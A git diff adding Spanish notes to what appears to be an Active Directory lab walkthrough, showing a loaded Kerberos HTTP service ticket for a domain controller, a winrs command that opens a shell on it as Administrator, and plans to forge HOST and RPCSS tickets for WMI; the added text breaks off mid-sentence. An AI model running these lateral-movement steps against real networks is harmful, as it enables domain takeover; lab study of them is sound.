@@ -852,4 +852,21 @@ C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args klist
 Server Name       : HTTP/dcorp-dc @ DOLLARCORP.MONEYCORP.LOCAL
 ```
 
-Esto quiere decir que tenemos el ticket del servicio *HTTP* para *dcorp-*
+Esto quiere decir que tenemos el ticket del servicio *HTTP* para *dcorp-dc*, como tenemos el ticket ya cargado vamos a intentar acceder a el a traves de *winrs*
+```shell
+[student97]
+winrs -r:dcorp-dc.dollarcorp.moneycorp.local cmd
+```
+
+Podemos ver que hemos obtenid acceso como *Administrator*
+```shell
+[dcorp-dc]
+set username
+set computername
+```
+
+Ahora deberemos acceder al servicio *WMI* (infraestructura central de Microsoft utilizada para gestionar y monitorizar).
+En este caso deberemos de crear dos tickets uno para el servicio *HOST* y otro para el *RPCSS*
+Nos deberemos abrir una CMD con privilegios
+y ej
+
